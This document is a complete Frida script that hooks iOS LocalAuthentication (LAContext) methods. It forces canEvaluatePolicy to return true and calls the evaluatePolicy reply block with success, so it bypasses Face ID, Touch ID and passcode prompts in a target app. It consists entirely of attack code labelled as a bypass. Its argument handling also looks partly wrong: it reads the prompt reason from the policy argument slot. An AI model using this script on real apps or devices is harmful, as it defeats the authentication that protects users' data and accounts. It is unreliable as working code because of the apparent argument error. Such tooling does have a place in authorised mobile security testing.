if (ObjC.available) {
    try {
        const laContext = ObjC.classes.LAContext;

        // Hook canEvaluatePolicy:error:
        const canEval = laContext["- canEvaluatePolicy:error:"];
        Interceptor.attach(canEval.implementation, {
            onEnter: function (args) {
                const policy = args[2].toInt32();
                console.log("[*] canEvaluatePolicy called with policy: " + policy);
            },
            onLeave: function (retval) {
                console.log("[*] Bypassing canEvaluatePolicy – returning YES");
                retval.replace(1); // Force true
            }
        });

        // Hook evaluatePolicy:localizedReason:reply:
        const evalPolicy = laContext["- evaluatePolicy:localizedReason:reply:"];
        Interceptor.attach(evalPolicy.implementation, {
            onEnter: function (args) {
                const reason = new ObjC.Object(args[2]);
                console.log("[*] evaluatePolicy called. Reason: " + reason.toString());
                this.reply = new ObjC.Block(args[4]); // Save the reply block
            },
            onLeave: function (retval) {
                console.log("[*] Bypassing biometric/passcode prompt.");
                this.reply.implementation(1, ptr("0x0")); // Call reply with success
            }
        });

        console.log("[+] Frida biometric/passcode bypass hooks installed.");
    } catch (err) {
        console.error("[-] Hook error: " + err.message);
    }
} else {
    console.error("[-] Objective-C runtime is not available.");
}
